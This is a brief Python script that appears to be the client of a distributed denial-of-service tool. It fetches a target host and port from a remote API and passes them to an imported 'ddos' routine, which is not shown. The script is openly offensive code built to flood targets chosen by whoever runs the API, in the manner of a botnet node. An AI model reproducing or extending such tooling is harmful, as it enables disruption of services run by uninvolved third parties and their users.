from ddos import main as ddos
from api import API

api = API()

def main():
  data = api.get_data()

  ddos(_host=data["host"], _port=data["port"])

if __name__ == '__main__':
  main()